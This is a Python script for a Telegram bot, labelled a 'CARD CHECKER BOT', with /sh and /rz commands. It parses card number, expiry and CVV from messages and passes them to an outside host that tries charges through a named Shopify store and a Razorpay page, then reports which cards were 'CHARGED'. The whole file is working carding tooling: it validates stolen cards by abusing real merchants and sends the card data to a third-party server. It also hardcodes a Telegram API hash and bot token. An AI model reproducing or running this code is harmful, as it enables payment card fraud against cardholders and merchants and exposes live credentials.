
import asyncio
import aiohttp
import json
import os
import re
import random
import time
from telethon import TelegramClient, events

API_ID = 21124241
API_HASH = "b7ddce3d3683f54eae73fa468"
BOT_TOKEN = "8894769120:AAEmQLRCAQWM6nTcJbzi3_Vf3AmLmFeljb8"
OWNER_NAME = "@Cvvvwasi"

def extract_card(text):
    m = re.search(r'(\d{12,16})[|\s/]*(\d{1,2})[|\s/]*(\d{2,4})[|\s/]*(\d{3,4})', text)
    if m:
        cc, mm, yy, cvv = m.groups()
        if len(yy) == 4: yy = yy[2:]
        return f"{cc}|{mm}|{yy}|{cvv}"
    return None

async def check_card(card, site, g):
    try:
        if not site.startswith('http'): site = f'https://{site}'
        url = f'https://teamoicxkiller.online/code/index.php?cc={card}&url={site}'
        if g == "rz": url = f'https://teamoicxkiller.online/code/razorpay.php?cc={card}&url={site}'
        async with aiohttp.ClientSession() as s:
            async with s.get(url, timeout=90) as r:
                if r.status == 200:
                    d = await r.json()
                    resp = d.get('Response', '')
                    p = d.get('Price', '-')
                    if "Order completed" in resp or "💎" in resp or "charged" in resp.lower():
                        return f"✅ CHARGED 💎\nResponse: {resp}\nPrice: ${p}" if p != '-' else f"✅ CHARGED 💎\nResponse: {resp}"
                    return f"❌ DECLINED\nResponse: {resp}"
    except Exception as e:
        return f"⚠️ ERROR: {e}"
    return "❌ DECLINED"

client = TelegramClient('bot', API_ID, API_HASH)

@client.on(events.NewMessage(pattern='/start'))
async def start(e):
    await e.reply(f"""🚀 CARD CHECKER BOT

/sh cc|mm|yy|cvv - Check Shopify
/rz cc|mm|yy|cvv - Check Razorpay

👑 Owner: {OWNER_NAME}""")

@client.on(events.NewMessage(pattern='/sh'))
async def sh(e):
    c = extract_card(e.raw_text)
    if not c: return await e.reply("Use: /sh 4111111111111111|12|26|123")
    m = await e.reply("🔄 Checking...")
    r = await check_card(c, "greenwich-house-pottery-store.myshopify.com", "sh")
    await m.delete()
    await e.reply(f"{r}\n\nCard: {c}\nGateway: Shopify")

@client.on(events.NewMessage(pattern='/rz'))
async def rz(e):
    c = extract_card(e.raw_text)
    if not c: return await e.reply("Use: /rz 4111111111111111|12|26|123")
    m = await e.reply("🔄 Checking Razorpay...")
    r = await check_card(c, "pages.razorpay.com/lckuk-international", "rz")
    await m.delete()
    await e.reply(f"{r}\n\nCard: {c}\nGateway: Razorpay")

async def main():
    print("🤖 Bot Starting...")
    await client.start(bot_token=BOT_TOKEN)
    print("✅ Bot Online!")
    await client.run_until_disconnected()

asyncio.run(main())
